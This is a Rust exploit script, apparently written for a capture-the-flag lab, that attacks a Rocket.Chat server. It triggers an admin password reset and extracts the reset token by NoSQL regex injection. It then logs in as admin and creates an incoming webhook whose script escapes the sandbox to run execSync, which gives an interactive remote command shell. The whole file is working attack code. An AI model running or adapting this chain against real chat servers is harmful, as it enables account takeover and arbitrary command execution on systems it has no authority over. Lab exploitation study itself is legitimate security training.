use std::{io::{stdin, stdout, Write}, process::exit};

use anyhow::Result;

use futures::{stream, StreamExt};
use reqwest::{redirect::Policy, Client, header::{HOST, COOKIE}};
use serde_json::{json, Value};

const SITE_URL: &str = "http://10.10.210.154";
const SITE_HOST: &str = "chat.rocket.thm";
const USERNAME: &str = "admin";
const EMAIL: &str = "admin@rocket.thm";
const NEW_PASSWORD: &str = "P@ssw0rd!";
const RESET_TOKEN_CHARS: &str = "abcdefghijklmnopqrstuvwxyz_ABCDEFGHIJKLMNOPQRSTUVWXYZ-0123456789";
const TOKEN_LENGTH: usize = 43;
const CONCURRENT: usize = 20;

#[tokio::main]
async fn main() -> Result<()> {
    ctrlc::set_handler(move || { exit(0) }).expect("Error setting Ctrl-C handler");

    if !reset_password(EMAIL).await {
        println!("failed to reset password");
        return Ok(());
    }
    println!("reset password successfully");

    let reset_token = get_reset_token().await;
    if reset_token.is_err() {
        println!("failed to get reset token");
        return Ok(());
    }
    let reset_token = reset_token.unwrap();
    println!("token found: {}", reset_token);

    if !change_password(reset_token, NEW_PASSWORD).await {
        println!("failed to change password");
        return Ok(());
    }
    println!("password changed successfully");

    let (uid, token) = login(USERNAME, NEW_PASSWORD).await;
    println!("logged in successfully");

    loop {
        let stdin = stdin();
        let mut stdout = stdout();
    
        print!("CMD:> ");
        let _ = stdout.flush();
    
        let mut buffer = String::new();
        if let Ok(_) = stdin.read_line(&mut buffer) {
            let cmd = buffer.trim_end();
            let (id, hook_token) = create_hook(cmd, &uid, &token).await;
            let result = call_hook( &id, &hook_token).await;
            println!("{}", result);
        }
    }
}

async fn client() -> Result<Client> {
    Ok(reqwest::Client::builder()
        //.proxy(Proxy::http("http://localhost:8080")?)
        .redirect(Policy::none())
        .build()?)
}

async fn reset_password(email: &str) -> bool {
    let client = client().await.unwrap();

    let body = json!({
        "msg": "method",
        "method": "sendForgotPasswordEmail",
        "params": [
            email
        ]
    });
    let body = json!({ "message": body.to_string() });

    let url = format!("{}/api/v1/method.callAnon/sendForgotPasswordEmail", SITE_URL);
    let resp = client.post(url).header(HOST, SITE_HOST).json(&body).send().await.unwrap();

    !resp.text().await.unwrap().contains("error")
}

async fn test_token(token: String) -> Option<String> {
    let client = client().await.unwrap();
    let body = json!({
        "msg": "method",
        "method": "getPasswordPolicy",
        "params": [{
            "token": {
                "$regex": format!("^{}", token)
            }
        }]
    });
    let body = json!({ "message": body.to_string() });

    let url = format!("{}/api/v1/method.callAnon/getPasswordPolicy", SITE_URL);
    let resp = client.post(url).header(HOST, SITE_HOST).json(&body).send().await.unwrap();

    if !resp.text().await.unwrap().contains("Meteor.Error") {
        Some(token)
    } else {
        None
    }
}

async fn get_reset_token() -> Result<String> {
    let mut token: String = "".into();
    while token.len() != TOKEN_LENGTH {
        let candidates = RESET_TOKEN_CHARS.chars().collect::<Vec<_>>().clone();
        let t = token.clone();
        let futures = candidates.iter().map(|c| format!("{}{}", t, c)).map(|s| async move { test_token(s).await });
        let res: Vec<Option<String>> = stream::iter(futures).buffer_unordered(CONCURRENT).collect().await;
        token = res.iter().find_map(|s| if let Some(s) = s { Some(s.clone()) } else { None }).unwrap();
        println!("Got: {}", token)
    }

    Ok(token)
}

async fn change_password(token: String, new_password: &str) -> bool {
    let client = client().await.unwrap();

    let body = json!({
        "msg": "method",
        "method": "resetPassword",
        "params": [
            token,
            new_password
        ]
    });
    let body = json!({ "message": body.to_string() });

    let url = format!("{}/api/v1/method.callAnon/resetPassword", SITE_URL);
    let resp = client.post(url).header(HOST, SITE_HOST).json(&body).send().await.unwrap();

    !resp.text().await.unwrap().contains("error")
}

async fn login(username: &str, password: &str) -> (String, String) {
    let client = client().await.unwrap();

    let body = json!({
        "msg": "method",
        "method": "login",
        "params": [{
                "user": {
                    "username": username,
                },
                "password": {
                    "digest": sha256::digest(password),
                    "algorithm": "sha-256",
                }
            },
        ]
    });
    let body = json!({ "message": body.to_string() });

    let url = format!("{}/api/v1/method.callAnon/login", SITE_URL);
    let resp = client.post(url).header(HOST, SITE_HOST).json(&body).send().await.unwrap();

    let text = resp.text().await.unwrap();
    let resp: Value = serde_json::from_str(&text).unwrap();
    let message = &resp["message"].to_string();
    let message = snailquote::unescape(&message).unwrap();
    let message: Value = serde_json::from_str(&message).unwrap();

    let id = message["result"]["id"].to_string();
    let token = message["result"]["token"].to_string();
    (snailquote::unescape(&id).unwrap(), snailquote::unescape(&token).unwrap())
}

async fn create_hook(cmd: &str, uid: &str, token: &str) -> (String, String) {
    let client = client().await.unwrap();

    let body = json!({
        "enabled": true,
        "channel": "#general",
        "username": "admin",
        "name": "rce",
        "alias": "",
        "avatarUrl": "",
        "emoji": "",
        "scriptEnabled": true,
        "script": "class Script { 
            process_incoming_request() { 
                const require = console.log.constructor('return process.mainModule.require')(); 
                const { execSync } = require('child_process'); 
                res = execSync('".to_string() + cmd + "'); 
                return { 
                    error: { 
                        sucess: false, 
                        error: res.toString() 
                    } 
                } 
            } 
        }",
        "type": "webhook-incoming"});

    let url = format!("{}/api/v1/integrations.create", SITE_URL);
    let cookie = format!("rc_uid={}; rc_token={}", uid, token);
    let resp = client.post(url).header(HOST, SITE_HOST).header(COOKIE, cookie).header("X-User-Id", uid).header("X-Auth-Token", token).json(&body).send().await.unwrap();

    let text = resp.text().await.unwrap();
    let resp: Value = serde_json::from_str(&text).unwrap();
    let integration = &resp["integration"].to_string();
    let integration: Value = serde_json::from_str(&integration).unwrap();
    
    let id = integration["_id"].to_string();
    let token = integration["token"].to_string();
    (snailquote::unescape(&id).unwrap(), snailquote::unescape(&token).unwrap())
}

async fn call_hook(id: &str, hook_token: &str) -> String {
    let client = client().await.unwrap();

    let url = format!("{}/hooks/{}/{}", SITE_URL, id, hook_token);
    let resp = client.post(url).header(HOST, SITE_HOST).send().await.unwrap();

    let text = resp.text().await.unwrap();
    let resp: Value = serde_json::from_str(&text).unwrap();
    let error = &resp["error"].to_string();
    snailquote::unescape(&error).unwrap()
}